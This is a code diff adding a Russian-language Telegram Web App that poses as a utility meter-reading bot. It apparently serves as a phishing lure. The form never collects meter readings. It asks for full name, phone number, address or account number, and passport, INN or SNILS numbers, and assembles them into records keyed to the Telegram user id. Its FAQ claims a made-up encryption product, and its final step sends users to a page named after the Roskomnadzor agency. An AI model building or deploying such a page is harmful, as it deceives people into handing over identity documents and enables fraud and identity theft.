@@ -1,1 +1,402 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ЖКХ-бот</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            transition: all 0.3s ease;
+        }
+        /* Light theme */
+        body[data-theme="light"] {
+            background-color: #ffffff;
+            color: #000000;
+        }
+        /* Dark theme */
+        body[data-theme="dark"] {
+            background-color: #1c2526;
+            color: #ffffff;
+        }
+        .btn {
+            @apply w-full py-3 rounded-lg font-medium transition-colors duration-200;
+        }
+        .btn-primary {
+            @apply bg-blue-500 text-white hover:bg-blue-600;
+        }
+        .btn-back {
+            @apply bg-gray-300 text-gray-800 hover:bg-gray-400 dark:bg-gray-600 dark:text-white dark:hover:bg-gray-500;
+        }
+        .input-field {
+            @apply w-full p-3 rounded-lg border bg-white text-black dark:bg-gray-700 dark:text-white dark:border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-start p-4" data-theme="light">
+    <div class="w-full max-w-md">
+        <div id="main-menu" class="space-y-4">
+            <h1 class="text-2xl font-bold text-center">🏠 ЖКХ-бот</h1>
+            <p class="text-center">Управляйте своими услугами легко и быстро! ✨</p>
+            <button class="btn btn-primary" onclick="startForm()">🔢 Передать показания</button>
+            <button class="btn btn-primary" onclick="showFAQ()">❓ Частые вопросы</button>
+            <button class="btn btn-primary" onclick="showInstructions()">ℹ️ Инструкция</button>
+            <button class="btn btn-primary" onclick="contactSupport()">📞 Связаться с техподдержкой</button>
+        </div>
 
+        <div id="form-container" class="hidden space-y-4">
+            <h2 id="form-title" class="text-xl font-semibold"></h2>
+            <p id="form-warning" class="text-red-500 font-medium hidden"><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+            <p id="form-error" class="text-red-500 hidden"></p>
+            <input id="form-input" type="text" class="input-field" placeholder="Введите данные">
+            <div id="form-buttons" class="space-y-2"></div>
+        </div>
+
+        <div id="faq-container" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">❓ Частые вопросы</h2>
+            <button class="btn btn-primary" onclick="showFAQAnswer('deadline')">⏳ До какого числа нужно передавать показания?</button>
+            <button class="btn btn-primary" onclick="showFAQAnswer('penalty')">💸 Что будет, если не передать данные вовремя?</button>
+            <button class="btn btn-primary" onclick="showFAQAnswer('safe')">🔒 Это безопасно?</button>
+            <button class="btn btn-primary" onclick="showFAQAnswer('telegram')">⚡️ Почему теперь через Telegram?</button>
+            <button class="btn btn-primary" onclick="showFAQAnswer('fix')">🔁 Можно ли исправить ошибку?</button>
+            <button class="btn btn-primary" onclick="showFAQAnswer('documents')">📑 Какие документы можно использовать?</button>
+            <button class="btn btn-back" onclick="backToMain()">↩️ Вернуться в меню</button>
+        </div>
+
+        <div id="faq-answer-container" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">❓ Ответ</h2>
+            <p id="faq-answer-text"></p>
+            <button class="btn btn-back" onclick="showFAQ()">↩️ Назад</button>
+        </div>
+
+        <div id="instructions-container" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">ℹ️ Инструкция</h2>
+            <p>📋 Чтобы передать показания:<br>
+            1️⃣ Нажмите «Указать ФИО».<br>
+            2️⃣ Введите номер телефона.<br>
+            3️⃣ Введите номер лицевого счета или адрес.<br>
+            4️⃣ Выберите документ и введите его номер.<br>
+            5️⃣ Получите подтверждение. ✨<br><br>
+            На любом этапе вы можете нажать '↩️ Назад', чтобы вернуться на предыдущий шаг. 💧</p>
+            <button class="btn btn-back" onclick="backToMain()">↩️ Вернуться в меню</button>
+        </div>
+
+        <div id="support-container" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">📞 Техподдержка</h2>
+            <p>Для связи с техподдержкой нажмите на ссылку ниже или напишите напрямую в чат:<br>
+            <a href="tg://resolve?domain=techsupgkh" class="text-blue-500 hover:underline">@techsupgkh</a> ✨</p>
+            <button class="btn btn-back" onclick="backToMain()">↩️ Вернуться в меню</button>
+        </div>
+
+        <div id="confirmation-container" class="hidden space-y-4">
+            <h2 class="text-xl font-semibold">✅ Подтверждение</h2>
+            <p>Для завершения подтвердите, что вы не робот! ✨</p>
+            <button class="btn btn-primary" onclick="Telegram.WebApp.openLink('https://roskomnadzor.figma.site/')">✅ Подтвердить, что я не робот</button>
+            <button class="btn btn-back" onclick="backToMain()">↩️ Вернуться в меню</button>
+        </div>
+    </div>
+
+    <script>
+        // Initialize Telegram Web App
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+
+        // Detect Telegram theme
+        const theme = Telegram.WebApp.colorScheme;
+        document.body.setAttribute('data-theme', theme);
+
+        // State management
+        let state = {
+            step: 'main',
+            formData: {},
+            currentFormState: null
+        };
+
+        // Navigation functions
+        function showMainMenu() {
+            state.step = 'main';
+            document.getElementById('main-menu').classList.remove('hidden');
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('faq-container').classList.add('hidden');
+            document.getElementById('faq-answer-container').classList.add('hidden');
+            document.getElementById('instructions-container').classList.add('hidden');
+            document.getElementById('support-container').classList.add('hidden');
+            document.getElementById('confirmation-container').classList.add('hidden');
+        }
+
+        function startForm() {
+            state.step = 'form';
+            state.currentFormState = 'fullname';
+            state.formData = {};
+            updateFormUI();
+        }
+
+        function showFAQ() {
+            state.step = 'faq';
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('faq-container').classList.remove('hidden');
+            document.getElementById('faq-answer-container').classList.add('hidden');
+            document.getElementById('instructions-container').classList.add('hidden');
+            document.getElementById('support-container').classList.add('hidden');
+            document.getElementById('confirmation-container').classList.add('hidden');
+        }
+
+        function showFAQAnswer(type) {
+            state.step = 'faq-answer';
+            const answers = {
+                deadline: '📌 Показания счетчиков воды и электроэнергии необходимо передавать до 25 числа каждого месяца. 💧',
+                penalty: '⚠️ Плата будет начислена по среднему — исходя из показаний приборов учета за последние полгода. 🔥',
+                safe: '🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). ✨',
+                telegram: '⚡️ В связи с нестабильной работой web-платформ был создан дополнительный ресурс. 💧',
+                fix: '✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌟',
+                documents: '👉 Паспорт, ИНН, СНИЛС или Лицевой счёт. 💧'
+            };
+            document.getElementById('faq-answer-text').innerText = answers[type];
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('faq-container').classList.add('hidden');
+            document.getElementById('faq-answer-container').classList.remove('hidden');
+            document.getElementById('instructions-container').classList.add('hidden');
+            document.getElementById('support-container').classList.add('hidden');
+            document.getElementById('confirmation-container').classList.add('hidden');
+        }
+
+        function showInstructions() {
+            state.step = 'instructions';
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('faq-container').classList.add('hidden');
+            document.getElementById('faq-answer-container').classList.add('hidden');
+            document.getElementById('instructions-container').classList.remove('hidden');
+            document.getElementById('support-container').classList.add('hidden');
+            document.getElementById('confirmation-container').classList.add('hidden');
+        }
+
+        function contactSupport() {
+            state.step = 'support';
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('faq-container').classList.add('hidden');
+            document.getElementById('faq-answer-container').classList.add('hidden');
+            document.getElementById('instructions-container').classList.add('hidden');
+            document.getElementById('support-container').classList.remove('hidden');
+            document.getElementById('confirmation-container').classList.add('hidden');
+        }
+
+        function backToMain() {
+            state.formData = {};
+            state.currentFormState = null;
+            showMainMenu();
+        }
+
+        // Form handling
+        function updateFormUI() {
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('form-container').classList.remove('hidden');
+            document.getElementById('faq-container').classList.add('hidden');
+            document.getElementById('faq-answer-container').classList.add('hidden');
+            document.getElementById('instructions-container').classList.add('hidden');
+            document.getElementById('support-container').classList.add('hidden');
+            document.getElementById('confirmation-container').classList.add('hidden');
+
+            const formInput = document.getElementById('form-input');
+            const formTitle = document.getElementById('form-title');
+            const formWarning = document.getElementById('form-warning');
+            const formError = document.getElementById('form-error');
+            const formButtons = document.getElementById('form-buttons');
+
+            formInput.value = '';
+            formError.classList.add('hidden');
+            formWarning.classList.remove('hidden');
+            formButtons.innerHTML = '<button class="btn btn-back" onclick="handleBack()">↩️ Назад</button>';
+
+            switch (state.currentFormState) {
+                case 'fullname':
+                    formTitle.innerText = '👤 Укажите Фамилию Имя Отчество полностью (только текст):';
+                    formInput.placeholder = 'Иванов Иван Иванович';
+                    break;
+                case 'phone':
+                    formTitle.innerText = '📞 Введите номер телефона (начните с +7 или 7, например: +79991234567):';
+                    formInput.placeholder = '+79991234567';
+                    break;
+                case 'account_or_address_choice':
+                    formWarning.classList.add('hidden');
+                    formTitle.innerText = 'Выберите способ идентификации: 🌟';
+                    formInput.classList.add('hidden');
+                    formButtons.innerHTML = `
+                        <button class="btn btn-primary" onclick="selectChoice('🏠 Адрес')">🏠 Адрес</button>
+                        <button class="btn btn-primary" onclick="selectChoice('💳 Лицевой счёт')">💳 Лицевой счёт</button>
+                        <button class="btn btn-back" onclick="handleBack()">↩️ Назад</button>
+                    `;
+                    break;
+                case 'account_or_address_value':
+                    formTitle.innerText = state.formData.account_or_address_choice === '🏠 Адрес' 
+                        ? 'Введите ваш адрес (пример: г. Москва, ул. Ленина, д. 10):' 
+                        : 'Введите номер лицевого счёта (пример: 40817810099910004312):';
+                    formInput.classList.remove('hidden');
+                    formInput.placeholder = state.formData.account_or_address_choice === '🏠 Адрес' 
+                        ? 'г. Москва, ул. Ленина, д. 10' 
+                        : '40817810099910004312';
+                    break;
+                case 'document_type':
+                    formWarning.classList.add('hidden');
+                    formTitle.innerText = 'Выберите документ: 🌟';
+                    formInput.classList.add('hidden');
+                    formButtons.innerHTML = `
+                        <button class="btn btn-primary" onclick="selectDocument('📄 Паспорт')">📄 Паспорт</button>
+                        <button class="btn btn-primary" onclick="selectDocument('🧾 ИНН')">🧾 ИНН</button>
+                        <button class="btn btn-primary" onclick="selectDocument('🟢 СНИЛС')">🟢 СНИЛС</button>
+                        <button class="btn btn-back" onclick="handleBack()">↩️ Назад</button>
+                    `;
+                    break;
+                case 'document_number':
+                    formTitle.innerText = state.formData.document_type === 'Паспорт' 
+                        ? 'Введите серию и номер паспорта (пример: 4510 123456):'
+                        : state.formData.document_type === 'ИНН' 
+                        ? 'Введите ИНН (пример: 500100732259):'
+                        : 'Введите СНИЛС (пример: 112-233-445 95):';
+                    formInput.classList.remove('hidden');
+                    formInput.placeholder = state.formData.document_type === 'Паспорт' 
+                        ? '4510 123456' 
+                        : state.formData.document_type === 'ИНН' 
+                        ? '500100732259' 
+                        : '112-233-445 95';
+                    break;
+            }
+        }
+
+        function handleBack() {
+            switch (state.currentFormState) {
+                case 'fullname':
+                    backToMain();
+                    break;
+                case 'phone':
+                    state.currentFormState = 'fullname';
+                    break;
+                case 'account_or_address_choice':
+                    state.currentFormState = 'phone';
+                    break;
+                case 'account_or_address_value':
+                    state.currentFormState = 'account_or_address_choice';
+                    break;
+                case 'document_type':
+                    state.currentFormState = 'account_or_address_value';
+                    break;
+                case 'document_number':
+                    state.currentFormState = 'document_type';
+                    break;
+            }
+            updateFormUI();
+        }
+
+        function selectChoice(choice) {
+            state.formData.account_or_address_choice = choice;
+            saveFormData();
+            state.currentFormState = 'account_or_address_value';
+            updateFormUI();
+        }
+
+        function selectDocument(doc) {
+            state.formData.document_type = doc;
+            saveFormData();
+            state.currentFormState = 'document_number';
+            updateFormUI();
+        }
+
+        function validateInput(value) {
+            switch (state.currentFormState) {
+                case 'fullname':
+                    if (!/^[А-Яа-яЁё\s-]+$/.test(value)) {
+                        showError('❌ ФИО должно содержать только буквы. Попробуйте снова. 🔥');
+                        return false;
+                    }
+                    return true;
+                case 'phone':
+                    const digits = value.replace(/[^0-9]/g, '');
+                    if (!(value.startsWith('+7') || value.startsWith('7'))) {
+                        showError('❌ Номер телефона должен начинаться с +7 или 7. Попробуйте снова. 🔥');
+                        return false;
+                    }
+                    if (digits.length < 10 || digits.length > 11) {
+                        showError('❌ Номер телефона должен содержать 10 или 11 цифр. Попробуйте снова. 🔥');
+                        return false;
+                    }
+                    return true;
+                case 'account_or_address_value':
+                    if (state.formData.account_or_address_choice === '🏠 Адрес') {
+                        if (value.length < 5 || !/\d/.test(value)) {
+                            showError('❌ Укажите корректный адрес (пример: г. Москва, ул. Ленина, д. 10). Попробуйте снова. 🔥');
+                            return false;
+                        }
+                    } else {
+                        if (!/^\d+$/.test(value) || value.length < 4) {
+                            showError('❌ Номер лицевого счёта должен содержать только цифры (не менее 4). Попробуйте снова. 🔥');
+                            return false;
+                        }
+                    }
+                    return true;
+                case 'document_number':
+                    return true; // No specific validation for document number
+                default:
+                    return false;
+            }
+        }
+
+        function showError(message) {
+            const formError = document.getElementById('form-error');
+            formError.innerText = message;
+            formError.classList.remove('hidden');
+        }
+
+        function saveFormData() {
+            const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+            const userId = Telegram.WebApp.initDataUnsafe.user?.id || 'unknown';
+            const username = Telegram.WebApp.initDataUnsafe.user?.username || '';
+            const userWithBot = username ? `@${username} (ЖКХ)` : '(ЖКХ)';
+            const record = `${timestamp}\t${userId}\t${userWithBot}\t${state.formData.fullname || ''}\t${state.formData.phone || ''}\t${state.formData.account_or_address_choice || ''} ${state.formData.account_or_address_value || ''}\t${state.formData.document_type || ''} ${state.formData.document_number || ''}`;
+            console.log('Saving record:', record);
+            // In a real app, send this to a backend server
+        }
+
+        document.getElementById('form-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                const value = e.target.value.trim();
+                if (validateInput(value)) {
+                    document.getElementById('form-error').classList.add('hidden');
+                    state.formData[state.currentFormState] = value;
+                    saveFormData();
+                    switch (state.currentFormState) {
+                        case 'fullname':
+                            state.currentFormState = 'phone';
+                            break;
+                        case 'phone':
+                            state.currentFormState = 'account_or_address_choice';
+                            break;
+                        case 'account_or_address_value':
+                            state.currentFormState = 'document_type';
+                            break;
+                        case 'document_number':
+                            document.getElementById('main-menu').classList.add('hidden');
+                            document.getElementById('form-container').classList.add('hidden');
+                            document.getElementById('faq-container').classList.add('hidden');
+                            document.getElementById('faq-answer-container').classList.add('hidden');
+                            document.getElementById('instructions-container').classList.add('hidden');
+                            document.getElementById('support-container').classList.add('hidden');
+                            document.getElementById('confirmation-container').classList.remove('hidden');
+                            state.formData = {};
+                            state.currentFormState = null;
+                            return;
+                    }
+                    updateFormUI();
+                }
+            }
+        });
+
+        // Initialize
+        showMainMenu();
+    </script>
+</body>
+</html>
